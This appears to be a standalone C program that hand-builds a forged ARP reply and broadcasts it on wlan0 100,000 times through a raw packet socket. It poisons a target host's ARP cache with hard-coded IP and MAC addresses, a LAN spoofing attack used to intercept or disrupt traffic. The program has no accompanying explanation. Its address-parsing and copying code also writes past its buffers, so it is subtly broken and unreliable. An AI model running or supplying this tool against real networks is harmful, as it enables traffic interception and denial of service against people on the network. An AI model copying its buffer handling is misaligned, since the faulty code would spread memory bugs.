#include<unistd.h>
#include<strings.h>
#include<string.h>
#include<stdio.h>
#include<stdlib.h>
#include<net/if_arp.h>
#include<net/ethernet.h>
#include<sys/types.h>
#include<sys/socket.h>
#define ARP_LEN 28
#define ETH_P_PARP 0x8035

void mac_str(char *mac,char *buf)
{
    sscanf(mac,"%x:%x:%x:%x:%x:%x",buf,buf+1,buf+2,buf+3,buf+4,buf+5);
}
void ip_str(char *ip,char *buf)
{
    sscanf(ip,"%d.%d.%d.%d",buf,buf+1,buf+2,buf+3);
}
void encapsulate_frame(char *dest_mac,char *source_mac,unsigned short type,char *buf)
{
    mac_str(dest_mac,buf);
    mac_str(source_mac,buf+6);
    *(unsigned int *)(buf+12)=htons(type);
}
void encapsulate_arp(unsigned short ar_op,char *source_mac,char *source_ip,char *dest_mac,char *dest_ip,char *buf)
{
    struct arphdr parp;
    parp.ar_hrd=htons(ARPHRD_ETHER);
    parp.ar_pro=htons(ETHERTYPE_IP);
    parp.ar_hln=6;
    parp.ar_pln=4;
    parp.ar_op=htons(ar_op);
    memcpy(buf,&parp,sizeof(struct arphdr));
    char addr_buf[20];
    mac_str(source_mac,addr_buf);
    ip_str(source_ip,addr_buf+6);
    mac_str(dest_mac,buf+10);
    ip_str(dest_ip,buf+16);
    memcpy(buf+sizeof(struct arphdr),addr_buf,20);
}

int open_packet_socket()
{
    int sock;
    if((sock=socket(AF_INET,SOCK_PACKET,htons(ETH_P_PARP)))<0)
    {
        perror("The raw socket waa not created!\n");
        exit(1);
    }
    return sock;
}
int main(int argc,char **argv)
{
    char *source_mac="74:E5:43:BB:3B:97";
    char *source_ip="192.168.137.1";
    //char *dest_mac="00:27:19:4C:18:B8";
    //char *dest_ip="192.168.1.1";
    char *dest_mac="E4:D5:3D:99:7E:D6";
    char *dest_ip="192.168.137.117";
    char *buf=malloc(sizeof(struct ether_header)+ARP_LEN);
    encapsulate_frame(dest_mac,source_mac,ETHERTYPE_ARP,buf);
    encapsulate_arp(ARPOP_REPLY,source_mac,source_ip,dest_mac,dest_ip,buf+sizeof(struct ether_header));
    int sock_fd=open_packet_socket();
    int i;
    struct sockaddr to;
    bzero(&to,sizeof(struct sockaddr));
    to.sa_family=AF_INET;
    strcpy(to.sa_data,"wlan0");
    for(i=0;i<100000;i++)
    {
        sendto(sock_fd,buf,42,0,&to,sizeof(struct sockaddr));
        usleep(100000);
    }
       
}
